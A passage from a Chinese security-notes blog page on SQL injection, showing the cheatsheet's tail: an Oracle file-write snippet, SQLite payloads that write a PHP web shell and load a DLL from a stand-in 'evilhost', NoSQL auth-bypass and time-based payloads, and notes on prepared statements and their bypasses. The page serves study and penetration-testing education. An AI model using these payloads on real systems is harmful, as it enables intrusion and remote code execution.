<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> directory TEST_DIR <span class="token keyword">as</span> <span class="token string">'/path/to/dir'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">grant</span> <span class="token keyword">read</span><span class="token punctuation">,</span> <span class="token keyword">write</span> <span class="token keyword">on</span> directory TEST_DIR <span class="token keyword">to</span> system<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">declare</span></pre></td></tr><tr><td data-num="4"></td><td><pre>   isto_file utl_file<span class="token punctuation">.</span>file_type<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">begin</span></pre></td></tr><tr><td data-num="6"></td><td><pre>   isto_file :<span class="token operator">=</span> utl_file<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span><span class="token string">'TEST_DIR'</span><span class="token punctuation">,</span> <span class="token string">'test.jsp'</span><span class="token punctuation">,</span> <span class="token string">'W'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>   utl_file<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>isto_file<span class="token punctuation">,</span> <span class="token string">'&lt;% out.println("test"); %>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>   utl_file<span class="token punctuation">.</span>fflush<span class="token punctuation">(</span>isto_file<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>   utl_file<span class="token punctuation">.</span>fclose<span class="token punctuation">(</span>isto_file<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">end</span><span class="token punctuation">;</span></pre></td></tr></table></figure><h2 id="sqlite3-payload"><a class="anchor" href="#sqlite3-payload">#</a> SQLite3 Payload</h2>
<ul>
<li>Comment
<ul>
<li><code>--</code></li>
<li><code>/**/</code></li>
</ul>
</li>
<li>Version
<ul>
<li><code>select sqlite_version();</code></li>
</ul>
</li>
</ul>
<p>Command Execution</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre>ATTACH <span class="token keyword">DATABASE</span> <span class="token string">'/var/www/lol.php'</span> <span class="token keyword">AS</span> lol<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> lol<span class="token punctuation">.</span>pwn <span class="token punctuation">(</span>dataz <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> lol<span class="token punctuation">.</span>pwn <span class="token punctuation">(</span>dataz<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'&lt;?system($_GET['</span>cmd<span class="token string">']); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--</span></pre></td></tr></table></figure><p>Load_extension</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span>load_extension<span class="token punctuation">(</span><span class="token string">'\\evilhost\evil.dll'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--</span></pre></td></tr></table></figure><h2 id="nosql-payload"><a class="anchor" href="#nosql-payload">#</a> NoSQL Payload</h2>
<h3 id="常见payload-4"><a class="anchor" href="#常见payload-4">#</a> 常见 Payload</h3>
<ul>
<li>绕过限制条件
<ul>
<li><code>&#123;&quot;username&quot;: &quot;user&quot;&#125;</code>  =&gt;  <code>&#123;&quot;username&quot;: &#123;&quot;ne&quot;: &quot;fakeuser&quot;&#125;&#125;</code></li>
<li><code>&#123;&quot;$where&quot;: &quot;return true&quot;&#125;</code></li>
</ul>
</li>
<li>测试用字符
<ul>
<li><code>'&quot;\/$[].&gt;</code></li>
</ul>
</li>
<li>布尔测试常用
<ul>
<li><code>&#123;&quot;$ne&quot;: -1&#125;</code></li>
<li><code>&#123;&quot;$in&quot;: []&#125;</code></li>
<li><code>&#123;&quot;$where&quot;: &quot;return true&quot;&#125;</code></li>
<li><code>&#123;&quot;$or&quot;: [&#123;&#125;,&#123;&quot;foo&quot;:&quot;1&quot;&#125;]&#125;</code></li>
</ul>
</li>
<li>时间
<ul>
<li><code>&#123;&quot;$where&quot;: &quot;sleep(100)&quot;&#125;</code></li>
</ul>
</li>
</ul>
<h1 id="预编译"><a class="anchor" href="#预编译">#</a> 预编译</h1>
<h2 id="简介-2"><a class="anchor" href="#简介-2">#</a> 简介</h2>
<p>SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL 引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。</p>
<h2 id="模拟预编译"><a class="anchor" href="#模拟预编译">#</a> 模拟预编译</h2>
<p>为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。</p>
<h2 id="绕过"><a class="anchor" href="#绕过">#</a> 绕过</h2>
<h3 id="预编译使用错误"><a class="anchor" href="#预编译使用错误">#</a> 预编译使用错误</h3>
<p>预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>
<h3 id="部分参数不可预编译"><a class="anchor" href="#部分参数不可预编译">#</a> 部分参数不可预编译</h3>
<p>在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>
<h3 id="预编译实现错误"><a class="anchor" href="#预编译实现错误">#</a> 预编译实现错误</h3>
<p>部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>
<h1 id="参考文章"><a class="anchor" href="#参考文章">#</a> 参考文章</h1>
<h2 id="tricks"><a class="anchor" href="#tricks">#</a> Tricks</h2>
<ul>
<li><span class="exturl" data-url="aHR0cDovL2Jsb2cud2lsczBuLmNuL2FyY2hpdmVzLzE3OC8=">sqlmap time based inject 分析</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9TUUxJbmplY3Rpb25XaWtp">SQLInjectionWiki</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnVjQ055Q215QVRkUkVOWnAwQUYyQQ==">常见数据库写入 Webshell 汇总</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdUVOdnBQYW43YVZkN01iU29BVDlEZw==">MSSQL 数据库攻击实战指北</span></li>
</ul>
<h2 id="bypass"><a class="anchor" href="#bypass">#</a> Bypass</h2>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZlNCWlBrTzAtSE5ZZkxnbVlXSktDZw==">SQL 注入 ByPass 的一些小技巧</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY4">Waf Bypass 之道</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsZWVuenovTVlTUUxfU1FMX0JZUEFTU19XSUtJ">MySQL Bypass Wiki</span></li>
</ul>
<h2 id="nosql"><a class="anchor" href="#nosql">#</a> NoSQL</h2>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3d3dy55dW53ZWlwYWkuY29tL2FyY2hpdmVzLzE0MDg0Lmh0bWw=">NoSQL 注入的分析和缓解</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdEc4NzRMTlRJZGlON01QdE8taG92QQ==">NoSQL 注入</span></li>
</ul>
<h2 id="cheatsheet-2"><a class="anchor" href="#cheatsheet-2">#</a> Cheatsheet</h2>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0lnbml0ZXRlY2hub2xvZ2llcy9NU1NRTC1QZW50ZXN0LUNoZWF0c2hlZXQ=">MSSQL Pentest Cheatsheet</span></li>
</ul>

      <div class="tags">
          <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"><i class="ic i-tag"></i> 网络安全</a>
          <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"><i class="ic i-tag"></i> 漏洞</a>
          <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="ic i-tag"></i> SQL注入</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2022-11-26 15:25:20" itemprop="dateModified" datetime="2022-11-26T15:25:20+08:00">2022-11-26</time>
  </span>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>晓楼 <i class="ic i-at"><em>@</em></i>Khala
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/" title="SQL注入">https://mobius-0.github.io/security/WebNote/Vulnerability Attack and defense/SQL/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/security/WebNote/information%20gathering/Social%20Engineering/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;11&#x2F;13&#x2F;mJcbwPV4zuS28ra.png" title="社会工程学">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> 信息收集</span>
  <h3>社会工程学</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2022&#x2F;11&#x2F;29&#x2F;tAlUb2jw8qYMVhC.png" title="XSS">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> 常见漏洞攻防</span>
  <h3>XSS</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text"> 注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text"> 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%89%E6%8A%80%E5%B7%A7%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text"> 按技巧分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%89%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E6%96%B9%E5%BC%8F%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.</span> <span class="toc-text"> 按获取数据的方式分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#inband"><span class="toc-number">1.3.1.</span> <span class="toc-text"> inband</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inference"><span class="toc-number">1.3.2.</span> <span class="toc-text"> inference</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#out-of-band-oob"><span class="toc-number">1.3.3.</span> <span class="toc-text"> out of band (OOB)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text"> 注入检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text"> 常见的注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fuzz%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text"> Fuzz 注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%94%A8%E5%B8%B8%E9%87%8F"><span class="toc-number">2.3.</span> <span class="toc-text"> 测试用常量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%88%97%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text"> 测试列数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text"> 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Egeometric%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.1.</span> <span class="toc-text"> 基于 geometric 的报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text"> 堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">2.7.</span> <span class="toc-text"> 注释符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="toc-number">2.8.</span> <span class="toc-text"> 判断过滤规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-number">2.9.</span> <span class="toc-text"> 获取信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%9D%83%E9%99%90"><span class="toc-number">2.10.</span> <span class="toc-text"> 测试权限</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text"> 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text"> UDF 提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A3%80%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text"> 数据库检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql"><span class="toc-number">4.1.</span> <span class="toc-text"> MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle"><span class="toc-number">4.2.</span> <span class="toc-text"> Oracle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlserver"><span class="toc-number">4.3.</span> <span class="toc-text"> SQLServer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#postgresql"><span class="toc-number">4.4.</span> <span class="toc-text"> PostgreSQL</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">5.</span> <span class="toc-text"> 绕过技巧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">6.</span> <span class="toc-text"> SQL 注入小技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">6.1.</span> <span class="toc-text"> 宽字节注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cheatsheet"><span class="toc-number">7.</span> <span class="toc-text"> CheatSheet</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-server-payload"><span class="toc-number">7.1.</span> <span class="toc-text"> SQL Server Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">7.1.1.</span> <span class="toc-text"> 常见 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%AF%BB%E5%86%99"><span class="toc-number">7.1.2.</span> <span class="toc-text"> 注册表读写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-2"><span class="toc-number">7.1.3.</span> <span class="toc-text"> 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">7.1.4.</span> <span class="toc-text"> 常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dns-oob"><span class="toc-number">7.1.5.</span> <span class="toc-text"> DNS OOB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">7.1.6.</span> <span class="toc-text"> 其他常用存储过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-payload"><span class="toc-number">7.2.</span> <span class="toc-text"> MySQL Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload-2"><span class="toc-number">7.2.1.</span> <span class="toc-text"> 常见 Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">7.2.1.1.</span> <span class="toc-text"> 报错注入常见函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">7.2.2.</span> <span class="toc-text"> 写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6%E5%89%8D%E6%8F%90"><span class="toc-number">7.2.2.1.</span> <span class="toc-text"> 写文件前提</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Einto%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">7.2.2.2.</span> <span class="toc-text"> 基于 into 写文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Elog%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">7.2.2.3.</span> <span class="toc-text"> 基于 log 写文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#postgressql-payload"><span class="toc-number">7.3.</span> <span class="toc-text"> PostgresSQL Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracle-payload"><span class="toc-number">7.4.</span> <span class="toc-text"> Oracle Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload-3"><span class="toc-number">7.4.1.</span> <span class="toc-text"> 常见 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6-2"><span class="toc-number">7.4.2.</span> <span class="toc-text"> 写文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlite3-payload"><span class="toc-number">7.5.</span> <span class="toc-text"> SQLite3 Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nosql-payload"><span class="toc-number">7.6.</span> <span class="toc-text"> NoSQL Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload-4"><span class="toc-number">7.6.1.</span> <span class="toc-text"> 常见 Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">8.</span> <span class="toc-text"> 预编译</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-2"><span class="toc-number">8.1.</span> <span class="toc-text"> 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">8.2.</span> <span class="toc-text"> 模拟预编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">8.3.</span> <span class="toc-text"> 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8%E9%94%99%E8%AF%AF"><span class="toc-number">8.3.1.</span> <span class="toc-text"> 预编译使用错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%A8%E5%88%86%E5%8F%82%E6%95%B0%E4%B8%8D%E5%8F%AF%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">8.3.2.</span> <span class="toc-text"> 部分参数不可预编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E5%AE%9E%E7%8E%B0%E9%94%99%E8%AF%AF"><span class="toc-number">8.3.3.</span> <span class="toc-text"> 预编译实现错误</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">9.</span> <span class="toc-text"> 参考文章</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tricks"><span class="toc-number">9.1.</span> <span class="toc-text"> Tricks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">9.2.</span> <span class="toc-text"> Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nosql"><span class="toc-number">9.3.</span> <span class="toc-text"> NoSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cheatsheet-2"><span class="toc-number">9.4.</span> <span class="toc-text"> Cheatsheet</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li class="active"><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/" rel="bookmark" title="SQL注入">SQL注入</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/" rel="bookmark" title="命令注入">命令注入</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/directory%20traversal/" rel="bookmark" title="目录穿越">目录穿越</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/" rel="bookmark" title="文件读取">文件读取</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/" rel="bookmark" title="文件上传">文件上传</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/" rel="bookmark" title="文件包含">文件包含</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/" rel="bookmark" title="XXE">XXE</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="bookmark" title="模板注入">模板注入</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/" rel="bookmark" title="Xpath">Xpath</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="逻辑漏洞/业务漏洞">逻辑漏洞/业务漏洞</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/" rel="bookmark" title="配置与策略安全">配置与策略安全</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="bookmark" title="中间件">中间件</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/" rel="bookmark" title="Web Cache欺骗攻击">Web Cache欺骗攻击</a></li><li><a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/" rel="bookmark" title="HTTP请求走私">HTTP请求走私</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="晓楼"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">晓楼</p>
  <div class="description" itemprop="description">GLHF</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">73</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">15</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">114</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL01vYml1cy0w" title="https:&#x2F;&#x2F;github.com&#x2F;Mobius-0"><i class="ic i-github"></i></span>
      <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTIxMzQ0Mjk2ODU=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;2134429685"><i class="ic i-cloud-music"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOnNlYWRyYWdvbjE1OUBvdXRsb29rLmNvbQ==" title="mailto:seadragon159@outlook.com"><i class="ic i-envelope"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a>
  </li>

    
  <li class="item">
    <a href="/favorites/" rel="section"><i class="ic i-star"></i>收藏</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/security/WebNote/information%20gathering/Social%20Engineering/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">晓楼 @ FAF MAVE</span>
  </div>
  <div class="count">
  
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="站点总字数">201k 字</span>

    <span class="post-meta-divider">|</span>

    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="站点阅读时长">4:03</span>
    
  </div>
  <div class="powered-by">
